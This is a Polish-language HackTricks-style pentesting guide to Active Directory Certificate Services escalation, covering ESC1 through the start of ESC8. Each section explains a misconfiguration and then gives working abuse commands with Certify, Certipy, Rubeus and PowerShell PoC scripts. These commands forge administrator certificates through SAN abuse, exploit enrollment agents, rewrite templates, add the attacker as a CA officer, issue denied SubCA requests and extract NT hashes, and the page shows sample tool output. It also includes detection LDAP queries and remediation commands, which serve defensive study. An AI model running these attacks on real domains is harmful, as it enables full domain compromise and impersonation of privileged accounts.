# Eskalacja domeny AD CS

{{#include ../../../banners/hacktricks-training.md}}


**To podsumowanie sekcji dotyczących technik eskalacji z artykułów:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Wyjaśnienie błędnie skonfigurowanych szablonów certyfikatów - ESC1

- **Enterprise CA przyznaje uprawnienia do enrolment użytkownikom o niskich uprawnieniach.**
- **Zatwierdzenie przez managera nie jest wymagane.**
- **Nie są wymagane podpisy upoważnionego personelu.**
- **Deskryptory zabezpieczeń szablonów certyfikatów są zbyt liberalne, umożliwiając użytkownikom o niskich uprawnieniach uzyskanie uprawnień do enrolment.**
- **Szablony certyfikatów są skonfigurowane tak, aby definiować EKU ułatwiające uwierzytelnianie:**
- Uwzględniane są identyfikatory Extended Key Usage (EKU), takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA).
- **Szablon zezwala requesterom na dołączanie subjectAltName do Certificate Signing Request (CSR):**
- Active Directory (AD) nadaje priorytet subjectAltName (SAN) w certyfikacie podczas weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że określając SAN w CSR, można zażądać certyfikatu umożliwiającego podszycie się pod dowolnego użytkownika (np. administratora domeny). To, czy requester może określić SAN, wskazuje właściwość `mspki-certificate-name-flag` w obiekcie AD szablonu certyfikatu. Właściwość ta jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` zezwala requesterowi na określenie SAN.

> [!CAUTION]
> Opisana konfiguracja pozwala użytkownikom o niskich uprawnieniach żądać certyfikatów z dowolnie wybranym SAN, umożliwiając uwierzytelnianie jako dowolny principal domeny za pośrednictwem Kerberos lub SChannel.

Funkcja ta jest czasami włączana w celu obsługi generowania certyfikatów HTTPS lub certyfikatów hosta w locie przez produkty lub usługi wdrożeniowe, a czasami z powodu braku zrozumienia.

Należy zauważyć, że utworzenie certyfikatu z tą opcją wywołuje ostrzeżenie. Nie ma to miejsca, gdy istniejący szablon certyfikatu (taki jak szablon `WebServer`, w którym włączono `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) zostanie zduplikowany, a następnie zmodyfikowany w celu uwzględnienia OID uwierzytelniania.<sup>[[6]](#references)</sup>

### Nadużycie

Aby **znaleźć podatne szablony certyfikatów**, możesz uruchomić:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Aby wykorzystać tę podatność do podszycia się pod administratora, można uruchomić:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Następnie możesz przekształcić wygenerowany **certyfikat do formatu `.pfx`** i użyć go do **ponownego uwierzytelnienia za pomocą Rubeus lub certipy**:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Pliki binarne systemu Windows „Certreq.exe” i „Certutil.exe” mogą zostać użyte do wygenerowania PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Enumerację szablonów certyfikatów w schemacie konfiguracji lasu AD, w szczególności tych, które nie wymagają zatwierdzenia ani podpisów, posiadają EKU Client Authentication lub Smart Card Logon oraz mają włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, można przeprowadzić, wykonując następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Błędnie skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia jest wariantem pierwszego:

1. Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do rejestracji.
2. Wymóg zatwierdzenia przez przełożonego jest wyłączony.
3. Pominięto wymóg autoryzowanych podpisów.
4. Nadmiernie liberalny deskryptor zabezpieczeń szablonu certyfikatu przyznaje użytkownikom o niskich uprawnieniach prawa do rejestracji certyfikatów.
5. **Szablon certyfikatu jest skonfigurowany tak, aby zawierał Any Purpose EKU lub nie zawierał EKU.**

**Any Purpose EKU** pozwala atakującemu uzyskać certyfikat do **dowolnego celu**, w tym do uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu itd. Do wykorzystania tego scenariusza można zastosować tę samą **technikę używaną w ESC3**.

Certyfikaty **bez EKU**, które działają jak certyfikaty podrzędnego CA, mogą zostać wykorzystane **w dowolnym celu** i mogą **służyć również do podpisywania nowych certyfikatów**. W związku z tym atakujący może określić dowolne EKU lub pola w nowych certyfikatach, korzystając z certyfikatu podrzędnego CA.

Nowe certyfikaty utworzone do **uwierzytelniania w domenie** nie będą działać, jeśli podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Atakujący może jednak nadal tworzyć **nowe certyfikaty z dowolnym EKU** i dowolnymi wartościami certyfikatu. Mogą one zostać potencjalnie **wykorzystane** do szerokiego zakresu celów (np. podpisywania kodu, uwierzytelniania serwera itd.) i mogą mieć istotne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.<sup>[[6]](#references)</sup>

Aby wyliczyć szablony pasujące do tego scenariusza w schemacie konfiguracji AD Forest, można wykonać następujące zapytanie LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Nieprawidłowo skonfigurowane szablony Enrollment Agent - ESC3

### Wyjaśnienie

Ten scenariusz jest podobny do pierwszego i drugiego, ale **wykorzystuje** **inny EKU** (Certificate Request Agent) oraz **2 różne szablony** (dlatego ma 2 zestawy wymagań),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), znany w dokumentacji Microsoft jako **Enrollment Agent**, pozwala podmiotowi **uzyskać** **certyfikat** **w imieniu innego użytkownika**.

**„Enrollment agent”** uzyskuje taki **certyfikat** z **szablonu** i używa wynikowego **certyfikatu do współpodpisania CSR w imieniu innego użytkownika**. Następnie **wysyła** **współpodpisany CSR** do CA, uzyskując certyfikat z **szablonu**, który **zezwala na „enroll on behalf of”**, a CA odpowiada **certyfikatem należącym do „innego” użytkownika**.<sup>[[6]](#references)</sup>

**Wymagania 1:**

- Enterprise CA przyznaje uprawnienia do uzyskiwania certyfikatów użytkownikom o niskich uprawnieniach.
- Wymóg zatwierdzenia przez menedżera jest pominięty.
- Brak wymogu autoryzowanych podpisów.
- Deskryptor zabezpieczeń szablonu certyfikatu jest nadmiernie liberalny i przyznaje uprawnienia do uzyskiwania certyfikatów użytkownikom o niskich uprawnieniach.
- Szablon certyfikatu zawiera Certificate Request Agent EKU, umożliwiając żądanie innych szablonów certyfikatów w imieniu innych podmiotów.

**Wymagania 2:**

- Enterprise CA przyznaje uprawnienia do uzyskiwania certyfikatów użytkownikom o niskich uprawnieniach.
- Zatwierdzenie przez menedżera jest omijane.
- Wersja schematu szablonu to 1 albo jest wyższa niż 2, a szablon określa wymaganie Application Policy Issuance Requirement, które wymaga Certificate Request Agent EKU.
- EKU zdefiniowany w szablonie certyfikatu zezwala na uwierzytelnianie w domenie.
- Ograniczenia dla Enrollment Agent nie są stosowane na CA.

### Nadużycie

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy), aby wykorzystać ten scenariusz:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**Użytkownicy**, którzy mogą **uzyskać** **certyfikat agenta rejestracji**, szablony, w których agenci rejestracji mogą dokonywać rejestracji, oraz **konta**, w imieniu których agent rejestracji może działać, mogą być ograniczane przez enterprise CA. Osiąga się to przez otwarcie **snap-inu** `certsrc.msc`, **kliknięcie prawym przyciskiem myszy na CA**, kliknięcie **Properties**, a następnie **przejście** do karty „Enrollment Agents”.

Należy jednak zauważyć, że **domyślne** ustawienie dla CA to „**Do not restrict enrollment agents**”. Gdy administratorzy włączą ograniczenie agentów rejestracji, ustawiając je na „Restrict enrollment agents”, domyślna konfiguracja nadal pozostaje wyjątkowo liberalna. Umożliwia ona **Everyone** rejestrację we wszystkich szablonach jako dowolna osoba.

### Windows-only PowerShell PoCs z Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) wykorzystuje ESC1 i ESC2/ESC3 bez Certify ani Certipy. Jego skrypty tworzą eksportowalny klucz RSA 2048-bitowy za pomocą interfejsu COM `X509Enrollment`, budują żądanie PKCS#10, wyszukują pierwszy `pKIEnrollmentService` przez LDAP, przesyłają je za pośrednictwem `CertificateAuthority.Request`, instalują odpowiedź w `Cert:\CurrentUser\My` oraz eksportują PFX zakodowany w Base64. Skrypt ESC1 dodaje wybrany przez atakującego UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, wartość `0xb`), natomiast skrypty ESC2/ESC3 używają pierwszego certyfikatu do podpisania żądania PKCS#7 w imieniu innego podmiotu.<sup>[[27]](#references)</sup>
```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
-altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
-target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```
Skrypty wypisują wartość Base64 **PFX**, która zawiera klucz prywatny, do bezpośredniego użycia z Rubeus. Nie zastępuj jej przez `[Convert]::ToBase64String($cert.RawData)`: `RawData` koduje tylko certyfikat publiczny i nie może podpisać żądania PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```
## Kontrola dostępu do podatnego szablonu certyfikatu - ESC4

### **Wyjaśnienie**

**Deskryptor zabezpieczeń** na **szablonach certyfikatów** definiuje **uprawnienia**, które posiadają określone **podmioty AD** w odniesieniu do szablonu.

Jeśli **atakujący** posiada wymagane **uprawnienia** do **modyfikowania** **szablonu** i **wprowadzenia** dowolnych **wykorzystywalnych błędnych konfiguracji** opisanych we **wcześniejszych sekcjach**, możliwe jest przeprowadzenie privilege escalation.

Najważniejsze uprawnienia dotyczące szablonów certyfikatów obejmują:<sup>[[6]](#references)</sup>

- **Owner:** Przyznaje niejawny control nad obiektem, umożliwiając modyfikację dowolnych atrybutów.
- **FullControl:** Zapewnia pełne uprawnienia do obiektu, w tym możliwość modyfikowania dowolnych atrybutów.
- **WriteOwner:** Umożliwia zmianę właściciela obiektu na podmiot kontrolowany przez atakującego.
- **WriteDacl:** Umożliwia modyfikację kontroli dostępu, potencjalnie przyznając atakującemu FullControl.
- **WriteProperty:** Umożliwia edytowanie dowolnych właściwości obiektu.

### Abuse

Aby zidentyfikować podmioty posiadające uprawnienia do edytowania szablonów i innych obiektów PKI, wykonaj enumerację za pomocą Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Przykład privesc podobnego do poprzedniego:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 występuje, gdy użytkownik ma uprawnienia do zapisu w szablonie certyfikatu. Można to na przykład wykorzystać do nadpisania konfiguracji szablonu certyfikatu, aby stał się podatny na ESC1.

Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nowe połączenie `AddKeyCredentialLink` do `JOHNPC`. Ponieważ ta technika jest związana z certyfikatami, zaimplementowałem również ten attack, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Oto krótki sneak peek komendy `shadow auto` narzędzia Certipy, służącej do pobrania NT hash ofiary.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** może nadpisać konfigurację szablonu certyfikatu za pomocą pojedynczego polecenia. **Domyślnie** Certipy **nadpisze** konfigurację, aby uczynić ją **podatną na ESC1**. Możemy również określić **parametr `-save-old`, aby zapisać starą konfigurację**, co będzie przydatne do **przywrócenia** konfiguracji po zakończeniu naszego ataku.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kontrola dostępu do podatnych obiektów PKI - ESC5

### Wyjaśnienie

Rozbudowana sieć wzajemnie powiązanych relacji opartych na ACL, obejmująca kilka obiektów poza szablonami certyfikatów i urzędem certyfikacji, może mieć wpływ na bezpieczeństwo całego systemu AD CS. Obiekty te, które mogą znacząco wpływać na bezpieczeństwo, obejmują:

- Obiekt komputera AD serwera CA, który może zostać przejęty za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
- Serwer RPC/DCOM serwera CA.
- Dowolny obiekt podrzędny AD lub kontener znajdujący się w określonej ścieżce kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ścieżka ta obejmuje między innymi kontenery i obiekty takie jak kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates oraz Enrollment Services Container.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli atakujący o niskich uprawnieniach zdoła przejąć kontrolę nad którymkolwiek z tych krytycznych komponentów.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Temat omówiony we [**wpisie CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) porusza również konsekwencje flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, zgodnie z opisem firmy Microsoft. Ta konfiguracja, po włączeniu w urzędzie certyfikacji (CA), umożliwia dodawanie **wartości zdefiniowanych przez użytkownika** do **alternatywnej nazwy podmiotu** dla **dowolnego żądania**, w tym żądań tworzonych na podstawie Active Directory®. W rezultacie umożliwia to **intruzowi** rejestrację za pomocą **dowolnego szablonu** skonfigurowanego do **uwierzytelniania** domenowego — w szczególności szablonów dostępnych dla **nieuprzywilejowanych** użytkowników, takich jak standardowy szablon User. Dzięki temu można uzyskać certyfikat umożliwiający intruzowi uwierzytelnianie się jako administrator domeny lub **dowolna inna aktywna jednostka** w domenie.<sup>[[9]](#references)</sup>

**Uwaga**: Sposób dodawania **alternatywnych nazw** do żądania podpisania certyfikatu (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (określanego jako „Name Value Pairs”) różni się od strategii wykorzystywania SAN w ESC1. Różnica polega na tym, **w jaki sposób informacje o koncie są opakowane** — znajdują się w atrybucie certyfikatu, a nie w rozszerzeniu.

### Nadużycie

Aby sprawdzić, czy to ustawienie jest aktywne, organizacje mogą użyć następującego polecenia z `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Ta operacja zasadniczo wykorzystuje **zdalny dostęp do rejestru**, dlatego alternatywnym podejściem może być:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykrywać tę błędną konfigurację i ją wykorzystywać:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Aby zmienić te ustawienia, zakładając, że posiada się uprawnienia **administratora domeny** lub równoważne, następujące polecenie można wykonać z dowolnej stacji roboczej:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Po aktualizacjach zabezpieczeń z maja 2022 r. nowo wydane **certificates** będą zawierać **security extension**, która uwzględnia właściwość **`objectSid` requestera**. W przypadku ESC1 ten SID jest uzyskiwany z określonego SAN. Jednak w przypadku **ESC6** SID odzwierciedla **`objectSid` requestera**, a nie SAN.\
> Aby wykorzystać ESC6, system musi być podatny na ESC10 (Weak Certificate Mappings), które nadaje priorytet **SAN przed nowym security extension**.

## Kontrola dostępu do podatnego Certificate Authority - ESC7

### Attack 1

#### Wyjaśnienie

Kontrola dostępu do certificate authority jest utrzymywana za pomocą zestawu uprawnień regulujących działania CA. Uprawnienia te można wyświetlić, uzyskując dostęp do `certsrv.msc`, klikając prawym przyciskiem myszy CA, wybierając właściwości, a następnie przechodząc do karty Security. Ponadto uprawnienia można enumerować za pomocą modułu PSPKI, używając poleceń takich jak:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Zapewnia to wgląd w podstawowe uprawnienia, czyli **`ManageCA`** i **`ManageCertificates`**, odpowiadające odpowiednio rolom „administratora CA” i „Menedżera certyfikatów”.<sup>[[6]](#references)</sup>

#### Abuse

Posiadanie uprawnień **`ManageCA`** w urzędzie certyfikacji umożliwia principalowi zdalne manipulowanie ustawieniami za pomocą PSPKI. Obejmuje to przełączanie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`** w celu zezwolenia na określanie SAN w dowolnym template, co stanowi kluczowy element domain escalation.

Uproszczenie tego procesu jest możliwe dzięki użyciu cmdletu **Enable-PolicyModuleFlag** z PSPKI, który umożliwia wprowadzanie modyfikacji bez bezpośredniej interakcji z GUI.

Posiadanie uprawnień **`ManageCertificates`** ułatwia zatwierdzanie oczekujących żądań, skutecznie omijając mechanizm zabezpieczający „zatwierdzanie przez menedżera certyfikatów CA”.

Do zażądania, zatwierdzenia i pobrania certyfikatu można wykorzystać kombinację modułów **Certify** i **PSPKI**:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Atak 2

#### Wyjaśnienie

> [!WARNING]
> W **poprzednim ataku** uprawnienia **`Manage CA`** zostały użyte do **włączenia** flagi **EDITF_ATTRIBUTESUBJECTALTNAME2** w celu przeprowadzenia **ataku ESC6**, ale nie przyniesie to żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie ponownie uruchomiona. Gdy użytkownik ma prawo dostępu **`Manage CA`**, może również **ponownie uruchomić usługę**. Nie oznacza to jednak, że użytkownik może ponownie uruchomić usługę zdalnie. Ponadto E**SC6 może nie działać od razu** w większości załatanych środowisk z powodu aktualizacji zabezpieczeń z maja 2022 roku.

Dlatego przedstawiono tutaj inny atak.

Wymagania wstępne:

- Tylko uprawnienie **`ManageCA`**
- Uprawnienie **`Manage Certificates`** (można je nadać z poziomu **`ManageCA`**)
- Szablon certyfikatu **`SubCA`** musi być **włączony** (można go włączyć z poziomu **`ManageCA`**)

Technika opiera się na fakcie, że użytkownicy z prawami dostępu **`Manage CA`** i **`Manage Certificates`** mogą **wystawiać odrzucone żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale tylko **administratorzy** mogą uzyskać w nim certyfikat. W związku z tym **użytkownik** może **złożyć żądanie** uzyskania certyfikatu z szablonu **`SubCA`** — które zostanie **odrzucone** — ale następnie zostanie wystawione przez administratora.<sup>[[6]](#references)</sup>

#### Nadużycie

Możesz **nadać sobie prawo dostępu `Manage Certificates`**, dodając swoje konto jako nowego urzędnika.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Jeśli spełniliśmy wymagania wstępne tego attacku, możemy rozpocząć od **żądania certyfikatu na podstawie template `SubCA`**.

**Żądanie zostanie odrzucone**, ale zachowamy klucz prywatny i zanotujemy identyfikator żądania.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mając uprawnienia **`Manage CA` i `Manage Certificates`**, możemy następnie **wystawić odrzucone żądanie certyfikatu** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
I na koniec możemy **pobrać wydany certyfikat** za pomocą polecenia `req` oraz parametru `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Abuse of the Manage Certificates Extension (SetExtension)

#### Wyjaśnienie

Oprócz klasycznych nadużyć ESC7 (włączania atrybutów EDITF lub zatwierdzania oczekujących żądań), **Certify 2.0** ujawniło zupełnie nową możliwość, która wymaga jedynie roli *Manage Certificates* (inaczej **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

Metoda RPC `ICertAdmin::SetExtension` może być wykonywana przez dowolnego principal posiadającego uprawnienie *Manage Certificates*. Choć metoda ta była tradycyjnie używana przez legalne CA do aktualizowania rozszerzeń w **oczekujących** żądaniach, attacker może ją wykorzystać do **dołączenia *niestandardowego* rozszerzenia certyfikatu** (na przykład niestandardowego OID *Certificate Issuance Policy*, takiego jak `1.1.1.1`) do żądania oczekującego na zatwierdzenie.

Ponieważ docelowy template **nie definiuje wartości domyślnej dla tego rozszerzenia**, CA **NIE** nadpisze wartości kontrolowanej przez attackera, gdy żądanie zostanie ostatecznie wystawione. Wynikowy certyfikat zawiera więc rozszerzenie wybrane przez attackera, które może:

* Spełniać wymagania Application / Issuance Policy innych podatnych template'ów (prowadząc do privilege escalation).
* Wstrzykiwać dodatkowe EKU lub policies, które nadają certyfikatowi nieoczekiwane zaufanie w systemach third-party.

Krótko mówiąc, *Manage Certificates* – wcześniej uznawane za „mniej potężną” część ESC7 – może teraz zostać wykorzystane do pełnego privilege escalation lub długotrwałego persistence, bez modyfikowania konfiguracji CA i bez wymagania bardziej restrykcyjnego uprawnienia *Manage CA*.

#### Nadużywanie tej możliwości za pomocą Certify 2.0

1. **Wyślij żądanie certyfikatu, które pozostanie *oczekujące*.** Można to wymusić za pomocą template'u wymagającego zatwierdzenia przez managera:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Dołącz niestandardowe rozszerzenie do oczekującego żądania**, używając nowej komendy `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Jeśli template nie definiuje już rozszerzenia *Certificate Issuance Policies*, powyższa wartość zostanie zachowana po wystawieniu certyfikatu.*

3. **Wystaw żądanie** (jeśli Twoja rola ma również uprawnienia zatwierdzania *Manage Certificates*) lub zaczekaj, aż operator je zatwierdzi. Po wystawieniu pobierz certyfikat:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Wynikowy certyfikat zawiera teraz złośliwy OID issuance-policy i może zostać użyty w kolejnych attacks (np. ESC13, domain escalation itd.).

> UWAGA: Ten sam attack można przeprowadzić za pomocą Certipy ≥ 4.7, używając komendy `ca` i parametru `-set-extension`.

## NTLM Relay do endpointów HTTP AD CS – ESC8

### Wyjaśnienie

> [!TIP]
> W środowiskach, w których zainstalowano **AD CS**, jeśli istnieje **podatny web enrollment endpoint** oraz opublikowano co najmniej jeden **certificate template**, który zezwala na enrollment komputerów domenowych i client authentication (taki jak domyślny template **`Machine`**), **dowolny komputer z aktywną usługą spooler może zostać przejęty przez attackera**!

AD CS obsługuje kilka **metod enrollment opartych na HTTP**, udostępnianych przez dodatkowe role serwera, które administratorzy mogą instalować. Te interfejsy enrollment certyfikatów oparte na HTTP są podatne na **NTLM relay attacks**. Attacker, z poziomu **compromised machine**, może podszyć się pod dowolne konto AD, które uwierzytelnia się za pośrednictwem przychodzącego NTLM. Podszywając się pod konto ofiary, attacker może uzyskać dostęp do tych interfejsów i **zażądać client authentication certificate, używając template'ów certyfikatów `User` lub `Machine`**.

- **Web enrollment interface** (starsza aplikacja ASP dostępna pod adresem `http://<caserver>/certsrv/`) domyślnie korzysta wyłącznie z HTTP, które nie zapewnia ochrony przed NTLM relay attacks. Ponadto jawnie zezwala tylko na uwierzytelnianie NTLM za pośrednictwem nagłówka Authorization HTTP, przez co bezpieczniejsze metody uwierzytelniania, takie jak Kerberos, nie mają zastosowania.
